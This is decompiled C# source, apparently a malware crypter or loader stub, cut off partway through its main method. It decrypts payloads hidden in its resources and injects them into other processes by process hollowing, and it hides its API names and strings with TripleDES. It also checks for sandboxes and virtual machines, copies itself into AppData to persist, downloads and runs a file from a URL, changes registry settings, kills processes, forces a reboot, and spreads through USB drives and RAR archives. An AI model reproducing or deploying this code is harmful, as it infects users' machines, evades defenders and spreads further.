using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class Class1
{
	public class vr30
	{
		private delegate bool vr21(string vr20, string vr18, IntPtr vr17, IntPtr vr16, bool vr15, int vr14, IntPtr vr13, string vr12, byte[] vr11, IntPtr[] vr10);

		private delegate bool vr22(IntPtr vr20, uint[] vr18);

		private delegate uint vr23(IntPtr vr20, IntPtr vr18);

		private delegate bool vr24(IntPtr vr20, IntPtr vr18, ref IntPtr vr17, IntPtr vr16, ref IntPtr vr15);

		private delegate int vr25(IntPtr vr20);

		private delegate IntPtr vr26(IntPtr vr20, IntPtr vr18, IntPtr vr17, int vr16, int vr15);

		private delegate bool vr28(IntPtr vr20, IntPtr vr18, byte[] vr17, IntPtr vr16, ref IntPtr vr15);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

		private static T vr0<T>(string vr20, string vr18)
		{
			return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref vr20), ref vr18), typeof(T));
		}

		public static void vr31(byte[] vr20)
		{
			string p = string.Empty;
			string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + TripleDES("3QLntef2HvEmjqVA1rl3kkFU8hy/hwmzyWWDV9xWNwMvOQFnsN1rCQ==", "SnT4n983GOC", d: true));
			foreach (string text in directories)
			{
				if (text.Contains(TripleDES("kiK7bRkespE=", "SjNL1wdFdxB", d: true)))
				{
					p = text + TripleDES("REUL6tukjcrcs4bsLxUYSg==", "Ss9aOMHbSt9", d: true);
					break;
				}
			}
			vr31(vr20, p);
		}

		public static void vr31(byte[] vr20, string P)
		{
			if (vr20[60] == 128)
			{
				Thread thread = new Thread(vr0);
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(vr20);
				return;
			}
			int[] array = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num = BitConverter.ToInt32(vr20, 60);
			checked
			{
				int num2 = BitConverter.ToInt16(vr20, num + 6);
				IntPtr vr21 = new IntPtr(BitConverter.ToInt32(vr20, num + 84));
				byte[] vr22 = new byte[68];
				IntPtr[] array2 = new IntPtr[4];
				IntPtr intPtr = default(IntPtr);
				if (!vr0<vr21>(TripleDES("NaAX2P23r2pPUEGmYPwtgA==", "SswtvoKRqJJ", d: true), TripleDES("otC+8k0adwHLutTe4xJM3A==", "S06pYVzNEEi", d: true))(null, P, intPtr, intPtr, vr15: false, 4, intPtr, null, vr22, array2))
				{
					return;
				}
				uint[] array3 = new uint[179];
				array3[0] = 65538u;
				if (vr0<vr22>(TripleDES("NaAX2P23r2pPUEGmYPwtgA==", "SswtvoKRqJJ", d: true), TripleDES("vDQGXXmWWFpiBhao2XHwABr3Yhn+SHJX", "S9lKQgOTWAf", d: true))(array2[1], array3))
				{
					vr24 vr23 = vr0<vr24>(TripleDES("NaAX2P23r2pPUEGmYPwtgA==", "SswtvoKRqJJ", d: true), TripleDES("rxUaHdogvNrAeCZTljaUwf4r4j7VRc7f", "SEJdzhjt0Lr", d: true));
					IntPtr vr24 = array2[0];
					IntPtr vr25 = new IntPtr(unchecked((long)array3[41]) + 8L);
					IntPtr vr26 = new IntPtr(4);
					IntPtr vr27 = default(IntPtr);
					IntPtr vr28 = default(IntPtr);
					if (vr23(vr24, vr25, ref vr27, vr26, ref vr28) && unchecked((long)vr0<vr23>(TripleDES("yIwtaCMSTlw=", "S5H8VzUJBcc", d: true), TripleDES("k3QITR74EsiQdYBK6dFuooV2qqJ8GuT6", "SzDdCB7qkFv", d: true))(array2[0], vr27)) == 0L)
					{
						vr26 vr29 = vr0<vr26>(TripleDES("NaAX2P23r2pPUEGmYPwtgA==", "SswtvoKRqJJ", d: true), TripleDES("ZkA17cuZhFofbpUxk1sArA==", "SFyqeNwH3AK", d: true));
						IntPtr vr30 = array2[0];
						IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(vr20, num + 52));
						IntPtr vr31 = intPtr2;
						IntPtr vr32 = new IntPtr(BitConverter.ToInt32(vr20, num + 80));
						IntPtr vr33 = vr29(vr30, vr31, vr32, 12288, 64);
						vr28 vr34 = vr0<vr28>(TripleDES("NaAX2P23r2pPUEGmYPwtgA==", "SswtvoKRqJJ", d: true), TripleDES("6eDDUGJvmF7DN7zzabwxPhn7CjzC1NlM", "SxdgjiVqicQ", d: true));
						vr34(array2[0], vr33, vr20, vr21, ref vr28);
						int num3 = num2 - 1;
						for (int i = 0; i <= num3; i++)
						{
							int[] array4 = new int[10];
							Buffer.BlockCopy(vr20, num + 248 + i * 40, array4, 0, 40);
							byte[] array5 = new byte[array4[4] - 1 + 1];
							IntPtr vr35 = new IntPtr(vr33.ToInt32() + array4[3]);
							int num4 = array5.Length;
							IntPtr vr36 = new IntPtr(num4);
							Buffer.BlockCopy(vr20, array4[5], array5, 0, num4);
							vr34(array2[0], vr35, array5, vr36, ref vr28);
						}
						IntPtr vr37 = array2[0];
						vr32 = new IntPtr(unchecked((long)array3[41]) + 8L);
						IntPtr vr38 = vr32;
						byte[] bytes = BitConverter.GetBytes(vr33.ToInt32());
						intPtr2 = new IntPtr(4);
						vr34(vr37, vr38, bytes, intPtr2, ref vr28);
						array3[44] = (uint)(vr33.ToInt32() + BitConverter.ToInt32(vr20, num + 40));
						vr0<vr22>(TripleDES("NaAX2P23r2pPUEGmYPwtgA==", "SswtvoKRqJJ", d: true), TripleDES("8fmcT9YPhh/K4ZHzeubbctSninR0VSM5", "S1GX9GeMurQ", d: true))(array2[1], array3);
					}
				}
				vr0<vr25>(TripleDES("NaAX2P23r2pPUEGmYPwtgA==", "SswtvoKRqJJ", d: true), TripleDES("6kIrDMLEk5WlNHE/hKcreA==", "Syxm3jyLITh", d: true))(array2[1]);
			}
		}

		private static void vr0(object vr0)
		{
			MethodInfo entryPoint = Assembly.Load((byte[])vr0).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[1] { new string[0] });
			}
			else
			{
				entryPoint.Invoke(null, null);
			}
		}
	}

	public class StairsEncryption
	{
		public static string DeCrypt(string Data, string key)
		{
			return Encoding.Default.GetString(DeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)));
		}

		public static byte[] DeCrypt(byte[] Data, byte[] key)
		{
			checked
			{
				object obj = default(object);
				object obj2 = default(object);
				if (ForLoopControl.ForLoopInitObj(obj, (object)(Data.Length - 1), (object)0, (object)(-1), ref obj2, ref obj))
				{
					do
					{
						Data[Conversions.ToInteger(obj)] = (byte)unchecked(checked((Data[Conversions.ToInteger(obj)] ^ key[Conversions.ToInteger(Operators.ModObject(obj, (object)key.Length))]) - unchecked((int)Data[Conversions.ToInteger(Operators.ModObject(Operators.AddObject(obj, (object)1), (object)Data.Length))]) + 256) % 256);
					}
					while (ForLoopControl.ForNextCheckObj(obj, obj2, ref obj));
				}
				return Data;
			}
		}
	}

	[AccessedThroughProperty("a1")]
	private static ManagementEventWatcher _a1;

	public static string a2;

	private string Targetdrive;

	private static ManagementEventWatcher a1
	{
		get
		{
			return _a1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected O, but got Unknown
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Expected O, but got Unknown
			if (_a1 != null)
			{
				_a1.remove_EventArrived(new EventArrivedEventHandler(Arrived));
			}
			_a1 = value;
			if (_a1 != null)
			{
				_a1.add_EventArrived(new EventArrivedEventHandler(Arrived));
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("N", Assembly.GetExecutingAssembly());
		string text = Conversions.ToString(resourceManager.GetObject("EO"));
		string[] array = Strings.Split(text, "SRHJrsWaVYR", -1, (CompareMethod)0);
		string text2 = TripleDES("pivi5ADugjA=", "Scz2Xx83d7w", d: true);
		if (Operators.CompareString(array[79], text2, false) == 0)
		{
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
			if (Process.GetProcessesByName(fileNameWithoutExtension).Length > 1)
			{
				ProjectData.EndApp();
			}
			else if (Process.GetProcessesByName(TripleDES("TT4TTzkmxQs=", "SGVdKDsMOqr", d: true)).Length >= 1)
			{
				ProjectData.EndApp();
			}
		}
		checked
		{
			if (Operators.CompareString(array[85], text2, false) == 0)
			{
				if (Operators.CompareString(array[65], text2, false) == 0)
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					string text3 = folderPath + TripleDES("bLY8YPH/eDL9sEShldWGwQ==", "SZZK05oR9pH", d: true);
					string text4 = folderPath + "\\" + Path.GetFileName(Application.get_ExecutablePath());
					if (!Directory.Exists(folderPath))
					{
						Directory.CreateDirectory(folderPath);
					}
					if (Operators.CompareString(Application.get_ExecutablePath(), text4, false) != 0)
					{
						FileSystem.FileOpen(10, text3, (OpenMode)32, (OpenAccess)2, (OpenShare)(-1), -1);
						FileSystem.FilePut(10, Application.get_ExecutablePath(), -1L, false);
						FileSystem.FileClose(new int[1] { 10 });
						FileSystem.FileOpen(20, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
						string text5 = Strings.Space((int)FileSystem.LOF(20));
						FileSystem.FileGet(20, ref text5, -1L, false);
						FileSystem.FileClose(new int[1] { 20 });
						FileSystem.FileOpen(30, text4, (OpenMode)32, (OpenAccess)2, (OpenShare)(-1), -1);
						FileSystem.FilePut(30, text5, -1L, false);
						FileSystem.FileClose(new int[1] { 30 });
						Process.Start(text4);
						Environment.Exit(0);
					}
					else if (File.Exists(text3))
					{
						object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text3);
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text3);
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
					}
				}
				if (Operators.CompareString(array[64], text2, false) == 0)
				{
					try
					{
						string text6 = TripleDES("tm18KgelqlknPpCckY+Ak8ByYU3Ra5+5eT9EjzqK3uCgAK4QbtyU1GCQpcaL6I8oaI9EJpiCY90ZCJcimby/wVkjGtGyybtUjwEJio+UcFM=", "Sg0PaJggXrc", d: true);
						((ServerComputer)MyProject.Computer).get_Registry().SetValue(text6, TripleDES("sToU4ECl9SFVnMcrJEzXBA==", "Ssxs79yrjkO", d: true), (object)"1", RegistryValueKind.DWord);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(array[66], text2, false) == 0)
				{
				}
				if (Operators.CompareString(array[67], text2, false) == 0)
				{
					string text7 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\1" + Path.GetFileName(Application.get_ExecutablePath());
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[70], text7);
					while (!File.Exists(text7))
					{
						Thread.Sleep(1000);
					}
					Process.Start(text7);
				}
				if (Operators.CompareString(array[69], text2, false) == 0)
				{
					try
					{
						File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.System) + TripleDES("y+tVJnEvaODKNlS3Y1FZlQ==", "SzzSuNmlKfC", d: true));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			if (Operators.CompareString(array[68], text2, false) == 0)
			{
				string text8 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TripleDES("xKQ7XzjhLqBxsJwGvDLa7w==", "SXSpW29qC56", d: true);
				if (!File.Exists(text8))
				{
					byte[] array2 = new byte[0];
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text8, array2, true);
					Interaction.Shell("shutdown -r -t 00", (AppWinStyle)0, false, -1);
				}
			}
			NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", new object[1] { Operators.MultiplyObject(resourceManager.GetObject("DE"), (object)1000) }, (string[])null, (Type[])null, (bool[])null, true);
			if (Operators.CompareString(array[82], text2, false) == 0)
			{
				string text9 = TripleDES("VJh7e05bSxL3KnkGmbuNCbsibdbpNu8a", "S5qWxr6NMAg", d: true);
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(TripleDES("AHRoCrQ31c6KlCpWKEp+QwNW0FxMFB1jdg+tPnUWTG9Vg40w+BSHRJGfCsmfQq/J", "SIR5ZbH5AQF", d: true), writable: false);
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(TripleDES("9XJd3zRWVDf1fTsTwUve1g==", "SFCvzqdp9dy", d: true)));
				string text10 = null;
				string text11 = TripleDES("497QtUmuuRV5R+SDHvJ1UppnFyma++17cPCAii0m7BTWIWhmkuCQGw==", "SFygWCUKZbn", d: true);
				object @object = Interaction.GetObject(TripleDES("ZZul1DefCluBhLXpR6Mtjg==", "SeguhaHOHZf", d: true), (string)null);
				object[] array3 = new object[1] { text11 };
				object[] array4 = array3;
				bool[] array5 = new bool[1] { true };
				object obj2 = NewLateBinding.LateGet(@object, (Type)null, "ExecQuery", array4, (string[])null, (Type[])null, array5);
				if (array5[0])
				{
					text11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((IEnumerable)objectValue2).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
						text10 = Conversions.ToString(NewLateBinding.LateGet(objectValue3, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				if (Operators.CompareString(array[7], text2, false) == 0 && Operators.CompareString(Application.get_ExecutablePath(), Application.get_StartupPath() + TripleDES("0n2X1lNpBU/Of1AvxBKovQ==", "SlQCwjR6GfU", d: true), false) == 0)
				{
					Thread.Sleep(10000);
				}
				if (Operators.CompareString(array[8], text2, false) == 0 && Operators.ConditionalCompareObjectEqual(objectValue, (object)text9, false))
				{
					Thread.Sleep(10000);
				}
				if (Operators.CompareString(array[9], text2, false) == 0)
				{
					A(TripleDES("sxIhKJPSDBrM1tqW7npf9w==", "SyCEmufKk6g", d: true));
				}
				if (Operators.CompareString(array[10], text2, false) == 0)
				{
					string text12 = text10;
					if (Operators.CompareString(text12, TripleDES("IfzxF/FlaP2OYiWtYkmQILcsWC8T7IIWNPoO9Fr+xvc=", "SBq3UqPpfbu", d: true), false) == 0)
					{
						Thread.Sleep(10000);
					}
				}
				if (Operators.CompareString(array[11], text2, false) == 0)
				{
					string text13 = text10;
					if (Operators.CompareString(text13, TripleDES("IrNO7DlISgVSgoej9jKkLu5dw+v0Hf5j7/xQCcwVzxY=", "SWsoDpvcDm2", d: true), false) == 0)
					{
						Thread.Sleep(10000);
					}
				}
				if (Operators.CompareString(array[12], text2, false) == 0)
				{
					A(TripleDES("Dun+VO+wwoQ=", "SKU6uHfNz8h", d: true));
				}
				if (Operators.CompareString(array[18], text2, false) == 0)
				{
					A(TripleDES("RwdjGRgj6os=", "S6MvjDn0ibv", d: true));
				}
				if (Operators.CompareString(array[20], text2, false) == 0)
				{
					string text14 = text10;
					if (Operators.CompareString(text14, TripleDES("n7IEVCWH1tauOUlxdOyxSw==", "SH6Hz1ZPS0v", d: true), false) == 0)
					{
						Thread.Sleep(10000);
					}
				}
				if (Operators.CompareString(array[28], text2, false) == 0)
				{
					A(TripleDES("n3qEjrE6cJU=", "S42x8F0BWte", d: true));
				}
				if (Operators.CompareString(array[29], text2, false) == 0)
				{
					A(TripleDES("AiVtjym1cvM=", "SEzRlAHYHAF", d: true));
				}
				if (Operators.CompareString(array[30], text2, false) == 0)
				{
					A(TripleDES("0Enh7FxDajQ=", "SoMEQ3wssjG", d: true));
				}
			}
			if ((Operators.CompareString(array[82], text2, false) == 0) | (Operators.CompareString(array[85], text2, false) == 0))
			{
				if (Operators.CompareString(array[13], text2, false) == 0)
				{
					Thread thread = new Thread(F13);
					thread.Start();
				}
				if (Operators.CompareString(array[14], text2, false) == 0)
				{
					Thread thread2 = new Thread(F14);
					thread2.Start();
				}
				if (Operators.CompareString(array[15], text2, false) == 0)
				{
					Thread thread3 = new Thread(F15);
					thread3.Start();
				}
				if (Operators.CompareString(array[16], text2, false) == 0)
				{
					Thread thread4 = new Thread(F16);
					thread4.Start();
				}
				if (Operators.CompareString(array[17], text2, false) == 0)
				{
					Thread thread5 = new Thread(F17);
					thread5.Start();
				}
				if (Operators.CompareString(array[19], text2, false) == 0)
				{
					Thread thread6 = new Thread(F19);
					thread6.Start();
				}
				if (Operators.CompareString(array[21], text2, false) == 0)
				{
					Thread thread7 = new Thread(F21);
					thread7.Start();
				}
				if (Operators.CompareString(array[22], text2, false) == 0)
				{
					Thread thread8 = new Thread(F22);
					thread8.Start();
				}
				if (Operators.CompareString(array[23], text2, false) == 0)
				{
					Thread thread9 = new Thread(F23);
					thread9.Start();
				}
				if (Operators.CompareString(array[24], text2, false) == 0)
				{
					Thread thread10 = new Thread(F24);
					thread10.Start();
				}
				if (Operators.CompareString(array[25], text2, false) == 0)
				{
					Thread thread11 = new Thread(F25);
					thread11.Start();
				}
				if (Operators.CompareString(array[26], text2, false) == 0)
				{
					Thread thread12 = new Thread(F26);
					thread12.Start();
				}
				if (Operators.CompareString(array[27], text2, false) == 0)
				{
					Thread thread13 = new Thread(F27);
					thread13.Start();
				}
				if (Operators.CompareString(array[59], text2, false) == 0)
				{
					Thread thread14 = new Thread(F59);
					thread14.Start();
				}
				if (Operators.CompareString(array[60], text2, false) == 0)
				{
					Thread thread15 = new Thread(F60);
					thread15.Start();
				}
				if (Operators.CompareString(array[61], text2, false) == 0)
				{
					Thread thread16 = new Thread(F61);
					thread16.Start();
				}
				if (Operators.CompareString(array[62], text2, false) == 0)
				{
					Thread thread17 = new Thread(F62);
					thread17.Start();
				}
				if (Operators.CompareString(array[63], text2, false) == 0)
				{
					Thread thread18 = new Thread(F63);
					thread18.Start();
				}
			}
			if (Operators.CompareString(array[84], text2, false) == 0)
			{
				vr30.vr31(Rc4((byte[])resourceManager.GetObject("WD"), (byte[])resourceManager.GetObject("K")));
			}
			((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();
			string text15 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()) + "..exe";
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("j7rrH1E9cq4=", "SkYm8edXxCh", d: true)))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text15, Rc4((byte[])resourceManager.GetObject("INJ"), (byte[])resourceManager.GetObject("K")), false);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(array[0], text2, false) == 0)
			{
				if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("j7rrH1E9cq4=", "SkYm8edXxCh", d: true)))
				{
					vr30.vr31(Rc4((byte[])resourceManager.GetObject("F"), (byte[])resourceManager.GetObject("K")));
				}
				else
				{
					vr30.vr31(Rc4((byte[])resourceManager.GetObject("F"), (byte[])resourceManager.GetObject("K")), text15);
				}
			}
			else if (Operators.CompareString(array[1], text2, false) == 0)
			{
				string s = xEncryption(Conversions.ToString(resourceManager.GetObject("KK")), Conversions.ToString(resourceManager.GetObject("F")));
				byte[] bytes = Encoding.Default.GetBytes(s);
				if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("j7rrH1E9cq4=", "SkYm8edXxCh", d: true)))
				{
					vr30.vr31(bytes);
				}
				else
				{
					vr30.vr31(bytes, text15);
				}
			}
			else if (Operators.CompareString(array[2], text2, false) != 0)
			{
				if (Operators.CompareString(array[3], text2, false) == 0)
				{
					string s2 = TripleDES(Conversions.ToString(resourceManager.GetObject("F")), Conversions.ToString(resourceManager.GetObject("KK")), d: true);
					byte[] bytes2 = Encoding.Default.GetBytes(s2);
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("j7rrH1E9cq4=", "SkYm8edXxCh", d: true)))
					{
						vr30.vr31(bytes2);
					}
					else
					{
						vr30.vr31(bytes2, text15);
					}
				}
				else if (Operators.CompareString(array[4], text2, false) == 0)
				{
					string s3 = Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("F")), Conversions.ToString(resourceManager.GetObject("KK"))));
					byte[] bytes3 = Encoding.Default.GetBytes(s3);
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("j7rrH1E9cq4=", "SkYm8edXxCh", d: true)))
					{
						vr30.vr31(bytes3);
					}
					else
					{
						vr30.vr31(bytes3, text15);
					}
				}
				else if (Operators.CompareString(array[5], text2, false) == 0)
				{
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("j7rrH1E9cq4=", "SkYm8edXxCh", d: true)))
					{
						vr30.vr31((byte[])NewLateBinding.LateGet((object)null, typeof(StairsEncryption), "DeCrypt", new object[2]
						{
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("F")),
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("K"))
						}, (string[])null, (Type[])null, (bool[])null));
					}
					else
					{
						vr30.vr31((byte[])NewLateBinding.LateGet((object)null, typeof(StairsEncryption), "DeCrypt", new object[2]
						{
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("F")),
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("K"))
						}, (string[])null, (Type[])null, (bool[])null), text15);
					}
				}
				else if (Operators.CompareString(array[6], text2, false) == 0)
				{
					byte[] vr;
					using (RC2CryptoServiceProvider rC2CryptoServiceProvider = new RC2CryptoServiceProvider())
					{
						rC2CryptoServiceProvider.IV = new byte[8] { 8, 7, 6, 5, 4, 3, 2, 1 };
						rC2CryptoServiceProvider.Key = new byte[16]
						{
							0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
							0, 1, 2, 3, 4, 5
						};
						vr = rC2CryptoServiceProvider.CreateDecryptor().TransformFinalBlock((byte[])resourceManager.GetObject("F"), 0, Conversions.ToInteger(NewLateBinding.LateGet(resourceManager.GetObject("F"), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)));
					}
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("j7rrH1E9cq4=", "SkYm8edXxCh", d: true)))
					{
						vr30.vr31(vr);
					}
					else
					{
						vr30.vr31(vr, text15);
					}
				}
			}
			try
			{
				if (Operators.CompareString(array[86], text2, false) == 0)
				{
					int i = 0;
					if (Operators.CompareString(array[71], text2, false) == 0)
					{
						for (; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Ei"), false); i++)
						{
							Process.Start(TripleDES("ZzDjGXIYwfM=", "ShkcSHInDUU", d: true));
						}
					}
					if (Operators.CompareString(array[72], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Ni"), false); i++)
						{
							Process.Start(TripleDES("pRZ4L4P5sbw=", "Sy4UfNSaAyr", d: true));
						}
					}
					if (Operators.CompareString(array[73], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Te"), false); i++)
						{
							try
							{
								Process.Start(array[78]);
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
						}
					}
					if (Operators.CompareString(array[74], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("El"), false); i++)
						{
							Netframe();
						}
					}
					if (Operators.CompareString(array[75], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Tw"), false); i++)
						{
							string text16 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 5f));
							try
							{
								string text17 = text16;
								if (Operators.CompareString(text17, Conversions.ToString(0), false) == 0)
								{
									text16 = TripleDES("36/02kj4I9DodKJQi3u6DQ==", "S0XRzTrwA7h", d: true);
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(1), false) == 0)
								{
									text16 = TripleDES("nEGWzd8YMhCvXj45msy8vg==", "SOvgleA8HE9", d: true);
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(2), false) == 0)
								{
									text16 = TripleDES("59//rolZ4yFOLA2OthrvaNerIsIF20ry", "SnxyrFiG8I5", d: true);
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(3), false) == 0)
								{
									text16 = TripleDES("vBvBFJgXMycoDMeke26GMc/a/35aw4DO", "SOBQdUREjnu", d: true);
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(4), false) == 0)
								{
									text16 = TripleDES("JjHh8B7CAz8zdxyXILnQvAbbCs4RKBSE", "SWdGUXu9XP5", d: true);
									Process.Start(text16);
								}
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
					}
					if (Operators.CompareString(array[76], text2, false) == 0)
					{
						string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + TripleDES("47uSWGVOS49xODNcl/C79OibHUBt2it4Oxs/2nwbTQc=", "S3zh8XRybkk", d: true);
						try
						{
							File.Delete(path);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
					}
					if (Operators.CompareString(array[77], text2, false) == 0)
					{
						try
						{
							Process[] processes = Process.GetProcesses();
							foreach (Process process in processes)
							{
								if (TripleDES("6+7b4bCO5osZrYZYWFe5eg==", "SFzgrN1El4x", d: true).Contains(process.ProcessName))
								{
									process.Kill();
								}
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
					}
				}
				if (Operators.CompareString(array[83], text2, false) == 0)
				{
					if (Operators.CompareString(array[53], text2, false) == 0)
					{
						USB();
					}
					if (Operators.CompareString(array[55], text2, false) == 0)
					{
						string text18 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue(TripleDES("c3Z/ygYK+32htWO+aTreKzJTjg2QtUqPcbzyCSIUkixseQ7Lth/USg==", "SuVnBo3Lxy2", d: true), TripleDES("CIcI/YZVowk=", "SK6Gu2qqlva", d: true), (object)0));
						text18.Replace("\\", "/");
						try
						{
							File.Copy(Application.get_ExecutablePath(), text18 + Path.GetFileName(Application.get_ExecutablePath()));
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						try
						{
							File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + TripleDES("CIcI/YZVowk=", "SK6Gu2qqlva", d: true) + "\\" + Path.GetFileName(Application.get_ExecutablePath()));
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
					}
					if (Operators.CompareString(array[56], text2, false) == 0)
					{
						Rar.INF(Application.get_ExecutablePath());
					}
				}
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			string text19 = null;
			if (Operators.CompareString(array[83], text2, false) == 0 && ((Operators.CompareString(array[47], text2, false) == 0) | (Operators.CompareString(array[48], text2, false) == 0)))
			{
				try
				{
					if (Operators.CompareString(array[49], text2, false) == 0)
					{
						text19 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					}
					if (Operators.CompareString(array[50], text2, false) == 0)
					{
						text19 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
					}
					if (Operators.CompareString(array[51], text2, false) == 0)
					{
						text19 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					}
					if (Operators.CompareString(array[52], text2, false) == 0)
					{
						if (Directory.Exists(TripleDES("R227vsg+VV/UXlW05yo33w==", "SU1rRzYTBez", d: true)))
						{
							text19 = TripleDES("TGOjsWRAMgb6M3vQ1XkEViQrQi4LegXrMMaPa8zSHwU=", "SvStXjK8p7h", d: true);
						}
						else if (Directory.Exists(TripleDES("UyHJODJR/p50wJHAzx2+vA==", "S0NL4Jp2eBV", d: true)))
						{
							text19 = TripleDES("P+QW+ylPe6lqLgMio/tKZITYDrBcGLLp+FXQWWjvlac=", "SpxyGqKne4g", d: true);
						}
					}
					AStartUp(Application.get_ExecutablePath(), text19);
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
